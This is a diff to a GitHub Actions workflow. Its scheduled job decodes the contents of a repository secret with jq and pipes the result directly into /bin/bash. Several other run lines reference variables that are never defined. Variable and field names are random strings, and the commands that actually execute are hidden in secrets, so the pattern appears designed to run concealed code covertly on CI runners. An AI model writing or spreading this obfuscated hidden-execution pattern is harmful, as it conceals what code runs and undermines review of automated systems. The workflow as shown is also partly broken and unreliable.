@@ -1,9 +1,9 @@
 name: trusteedartboard
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '43 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: trusteedartboard
         env:
-          v789: ${{ secrets.v789 }}
+          b561: ${{ secrets.b561 }}
         run: |
-          echo $v789 | jq -r .cx49104 | /bin/bash
-          echo $k3 | jq -r .lmya143 | /bin/bash
-          echo $rnfl98186 | jq -r .fpqa3 | /bin/bash
-          echo $snq870 | jq -r .vhhma1072 | /bin/bash
-          echo $ah955 | jq -r .zk805 | /bin/bash
-          echo $wwhhv4 | jq -r .qp02100 | /bin/bash
-          echo $drx267 | jq -r .q122 | /bin/bash
-          echo $opahc28078 | jq -r .hhak6 | /bin/bash
-          echo $ilafy58 | jq -r .a51 | /bin/bash
+          echo $b561 | jq -r .ehs9433 | /bin/bash
+          echo $mnhj28726 | jq -r .n88 | /bin/bash
+          echo $rnju927 | jq -r .hycmm8133 | /bin/bash
+          echo $j85 | jq -r .jfc735 | /bin/bash
 
